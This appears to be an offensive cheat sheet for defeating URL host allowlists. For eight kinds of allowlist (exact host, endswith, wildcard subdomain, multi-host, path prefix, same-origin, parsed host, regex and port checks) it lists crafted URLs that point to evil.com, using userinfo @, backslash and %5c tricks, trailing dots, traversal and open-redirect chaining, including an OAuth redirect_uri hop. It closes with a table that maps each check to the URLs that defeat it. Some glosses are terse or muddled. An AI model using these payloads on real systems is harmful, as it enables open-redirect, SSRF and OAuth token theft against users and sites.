# Per-target — the host allowlist/read variations

## Target-form 1 — the apex allowlist `target.com`

```text
the check: host == 'target.com' / endswith('target.com') / contains
the bypass-arms:
  https://target.com.evil.com     <- a subdomain — host ends evil.com
  https://eviltarget.com          <- the no-boundary contains
  https://target.com-evil.com     <- a hyphen-suffix
  https://x.target.com            <- a real subdomain — a wildcard-allowlist gap
  https://target.com@evil.com     <- the userinfo
  https://evil.com\@target.com    <- the \@
  https://target.com.evil.com/x   <- a subdomain + path
```

## Target-form 2 — the `*.target.com` wildcard allowlist

```text
the check:  host ends '.target.com' OR host == 'target.com'
the bypass: a SUBDOMAIN of target.com is allowed — find a subdomain-takeover
            or a controllable subdomain:
  https://attacker-controlled-sub.target.com   <- a controllable subdomain
  https://x.target.com.evil.com                <- a deeper that fails the parse
  https://x.target.com@evil.com                <- a subdomain-userinfo mix
```

## Target-form 3 — the multi-host allowlist `[a.com, b.com, c.com]`

```text
the check: host in [a.com, b.com, c.com]
the bypass: an open-redirect on ANY allowlisted host -> the chain-hop
  find: an open-redirect on a.com / b.com / c.com -> redirect_uri =
        https://a.com/redirect?next=https://evil.com
```

## Target-form 4 — the path-prefix allowlist `target.com/app/*`

```text
the check: url.startswith('https://target.com/app')
the bypass: https://target.com/app@evil.com   <- the userinfo
            https://target.com/app/../@evil.com <- the path-traversal
            https://target.com/app%2f@evil.com  <- the encoded
            https://target.com/app.evil.com     <- the suffix-gap
            https://target.com/app/../evil.com  <- the ..-collapse
```

## Target-form 5 — the same-origin allowlist (relative-only)

```text
the check: url is same-origin — a path-only / a same-origin URL
the bypass: the // / \ / %5c scheme-relative + backslash arms
  //evil.com, /\evil.com, \\evil.com, /%5cevil.com, https:evil.com
```

## Target-form 6 — the parsed-host allowlist

```text
the check: urlparse(url).hostname in allowed
the bypass: the parser-differential — the filter's parse ≠ the browser's
  https://evil.com\@target.com      <- the \@ gap
  https://evil.com%5c.target.com    <- the %5c gap
  https://evil.com%40target.com     <- the %40 gap
  https://evil.com#@target.com      <- the # gap
  https://evil.com?@target.com      <- the ? gap
```

## Target-form 7 — the regex allowlist

```text
the check: re.match(r'^https?://(?:\w+\.)*target\.com', url)
the bypass: the regex-prefix vs the full-parse gap
  https://x.target.com@evil.com   <- the regex matches the prefix
  https://target.com.evil.com     <- depends on the regex-tail
  https://target.com\@evil.com    <- the \@
  https://target.com%5c.evil.com  <- the %5c
```

## Target-form 8 — the port/authority allowlist

```text
the check: netloc == 'target.com' / 'target.com:443'
the bypass: https://target.com:443@evil.com  <- userinfo+port
            https://target.com.               <- the trailing-dot
            https://target.com%3a443          <- the encoded :
```

## The target-to-arm map

| The allowlist form | The defeating arm |
|---|---|
| `== target.com` | `target.com.evil.com`, `target.com@evil.com`, `evil.com\@target.com`, `target.com.` |
| `endswith target.com` | `target.com.evil.com` (the HOST ends evil.com — fails the host-check BUT passes a STRING-check on the URL) |
| `contains target.com` | `evil.com/target.com`, `evil.com?target.com`, `target.com.evil.com`, `eviltarget.com` |
| `*.target.com` | a controllable `x.target.com`, `x.target.com.evil.com` |
| `target.com/app` | `target.com/app@evil.com`, `target.com/app/../@evil.com` |
| `== path-only` | `//evil.com`, `/\evil.com`, `%5c` |
| `parsed-host in [...]` | the parser-differential arms |
| the regex | `x.target.com@evil.com`, `target.com\@evil.com` |

## The per-target record

`target: <the-allowlist-form>: <the-defeating-arm>: <the-parsed-host>`
